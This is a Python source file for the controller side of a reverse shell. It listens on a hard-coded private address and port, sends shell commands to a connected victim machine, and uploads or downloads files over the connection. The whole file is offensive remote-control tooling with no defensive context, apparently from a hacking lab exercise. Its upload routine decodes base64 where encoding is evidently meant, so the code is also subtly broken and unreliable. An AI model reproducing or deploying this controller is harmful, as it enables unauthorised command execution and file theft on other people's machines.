import socket
import base64
import simplejson

class SocketListener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("Listening...")
        (self.connection, address) = listener.accept()
        print("Connection OK from" + str(address) + "\n")

    def json_send(self, data):
        json_data = simplejson.dumps(data, encoding="latin-1")
        self.connection.send(json_data.encode("latin-1"))

    def json_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode("latin-1")
                return simplejson.loads(json_data.encode("latin-1"))
            except ValueError:
                continue

    def command_execution(self, command_input):
        self.json_send(command_input)

        if command_input[0] == "quit":
            self.connection.close()
            exit()
        return self.json_receive()

    def save_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "Download OK!"

    def get_file(self, path):
        with open(path, "rb") as file:
            return base64.b64decode(file.read())

    def start_listener(self):
        while True:
            command_input = input("Enter command: ")
            command_input = command_input.split(" ")

            try:
                if command_input[0] == "upload":
                    file = self.get_file(command_input[1])
                    command_input.append(file)

                command_output = self.command_execution(command_input)

                if command_input[0] == "download" and "Error!" not in command_output:
                    command_output = self.save_file(command_input[1], command_output)
            except Exception:
                command_output = "Error!"
            print(command_output)

socket_listener = SocketListener("10.0.2.128", 8080)
socket_listener.start_listener()
